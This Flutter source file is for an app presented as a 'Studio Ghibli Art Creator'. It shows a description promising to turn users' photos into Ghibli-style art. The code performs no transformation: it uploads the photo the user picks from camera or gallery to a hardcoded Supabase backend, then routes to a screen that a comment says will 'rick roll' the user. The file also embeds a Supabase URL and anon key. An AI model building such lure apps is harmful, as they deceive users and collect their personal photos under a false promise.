import 'package:flutter/material.dart';
import 'package:image_picker/image_picker.dart';
import 'package:supabase_flutter/supabase_flutter.dart';
import 'package:ghibli_creator/services/rate_limiter.dart';
import 'package:ghibli_creator/services/supabase_service.dart';
import 'package:ghibli_creator/screens/loading_screen.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // Hardcoded Supabase credentials for test app
  const supabaseUrl = 'https://nbskxnehhsrfatmozbwa.supabase.co';
  const supabaseAnonKey =
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5ic2t4bmVoaHNyZmF0bW96YndhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDMzMzAwNjYsImV4cCI6MjA1ODkwNjA2Nn0.vzN241pU_Lctuc1QqDu0xfesoWLKmzkvQUy8mMBbj0g';

  await Supabase.initialize(url: supabaseUrl, anonKey: supabaseAnonKey);

  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Ghibli Art Creator',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(
          seedColor: Colors.blue,
          brightness: Brightness.dark,
        ),
        useMaterial3: true,
      ),
      home: const GhibliHomePage(),
    );
  }
}

class GhibliHomePage extends StatefulWidget {
  const GhibliHomePage({super.key});

  @override
  State<GhibliHomePage> createState() => _GhibliHomePageState();
}

class _GhibliHomePageState extends State<GhibliHomePage> {
  bool _isUploading = false;
  final RateLimiter _rateLimiter = RateLimiter();
  final SupabaseService _supabaseService = SupabaseService();
  final ImagePicker _picker = ImagePicker();

  Future<void> _pickImage(ImageSource source) async {
    try {
      // Check rate limit first
      final canUpload = await _rateLimiter.canUpload();
      if (!canUpload) {
        if (!mounted) return;
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(
            content: Text(
              'Upload limit reached (5 per hour). Please try again later.',
            ),
            backgroundColor: Colors.red,
          ),
        );
        return;
      }

      final XFile? pickedFile = await _picker.pickImage(
        source: source,
        imageQuality: 85,
      );

      if (pickedFile != null) {
        setState(() {
          _isUploading = true;
        });

        // Upload to Supabase - for web only
        await _supabaseService.uploadImage(pickedFile);

        if (!mounted) return;

        // Navigate to the loading screen (which will eventually rick roll)
        Navigator.push(
          context,
          MaterialPageRoute(builder: (context) => const LoadingScreen()),
        );

        setState(() {
          _isUploading = false;
        });
      }
    } catch (e) {
      setState(() {
        _isUploading = false;
      });
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text('Error: ${e.toString()}'),
          backgroundColor: Colors.red,
        ),
      );
    }
  }

  Future<void> _showImageSourceDialog() async {
    return showDialog(
      context: context,
      builder: (BuildContext context) {
        return AlertDialog(
          backgroundColor: Colors.black87,
          title: const Text(
            'Select Image Source',
            style: TextStyle(color: Colors.white),
          ),
          content: SingleChildScrollView(
            child: ListBody(
              children: <Widget>[
                GestureDetector(
                  child: const Padding(
                    padding: EdgeInsets.all(8.0),
                    child: Text(
                      'Camera',
                      style: TextStyle(color: Colors.white),
                    ),
                  ),
                  onTap: () {
                    Navigator.of(context).pop();
                    _pickImage(ImageSource.camera);
                  },
                ),
                const SizedBox(height: 16),
                GestureDetector(
                  child: const Padding(
                    padding: EdgeInsets.all(8.0),
                    child: Text(
                      'Gallery',
                      style: TextStyle(color: Colors.white),
                    ),
                  ),
                  onTap: () {
                    Navigator.of(context).pop();
                    _pickImage(ImageSource.gallery);
                  },
                ),
              ],
            ),
          ),
        );
      },
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        children: [
          // Background
          Positioned.fill(
            child: Opacity(
              opacity: 0.6,
              child: Image.asset('assets/g3.jpg', fit: BoxFit.cover),
            ),
          ),

          SafeArea(
            child: Padding(
              padding: const EdgeInsets.all(20.0),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.stretch,
                children: [
                  const SizedBox(height: 40),
                  // App title
                  const Text(
                    'Studio Ghibli\nArt Creator',
                    style: TextStyle(
                      fontSize: 42,
                      fontWeight: FontWeight.bold,
                      color: Colors.white,
                      shadows: [
                        Shadow(
                          blurRadius: 10.0,
                          color: Colors.black54,
                          offset: Offset(2.0, 2.0),
                        ),
                      ],
                    ),
                    textAlign: TextAlign.center,
                  ),
                  const SizedBox(height: 20),

                  // App description
                  Container(
                    padding: const EdgeInsets.all(16),
                    decoration: BoxDecoration(
                      color: Colors.black.withOpacity(0.5),
                      borderRadius: BorderRadius.circular(15),
                    ),
                    child: const Text(
                      'Transform your photos into beautiful Ghibli-style artwork with magical elements and dreamy aesthetics.',
                      style: TextStyle(fontSize: 16, color: Colors.white),
                      textAlign: TextAlign.center,
                    ),
                  ),

                  const Spacer(),

                  // Sample images row
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                    children: [
                      ClipRRect(
                        borderRadius: BorderRadius.circular(10),
                        child: Image.asset(
                          'assets/g1.jpeg',
                          width: 100,
                          height: 100,
                          fit: BoxFit.cover,
                        ),
                      ),
                      ClipRRect(
                        borderRadius: BorderRadius.circular(10),
                        child: Image.asset(
                          'assets/g2.jpg',
                          width: 100,
                          height: 100,
                          fit: BoxFit.cover,
                        ),
                      ),
                    ],
                  ),

                  const SizedBox(height: 30),

                  // Upload button
                  ElevatedButton(
                    onPressed: _isUploading ? null : _showImageSourceDialog,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.blue,
                      foregroundColor: Colors.white,
                      padding: const EdgeInsets.symmetric(vertical: 15),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(12),
                      ),
                    ),
                    child:
                        _isUploading
                            ? const CircularProgressIndicator(
                              color: Colors.white,
                            )
                            : const Text(
                              'TRANSFORM YOUR PHOTO',
                              style: TextStyle(
                                fontSize: 18,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                  ),

                  const SizedBox(height: 10),

                  // Rate limit info
                  const Text(
                    'Limited to 5 transformations per hour',
                    style: TextStyle(fontSize: 12, color: Colors.white70),
                    textAlign: TextAlign.center,
                  ),

                  const SizedBox(height: 40),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }
}
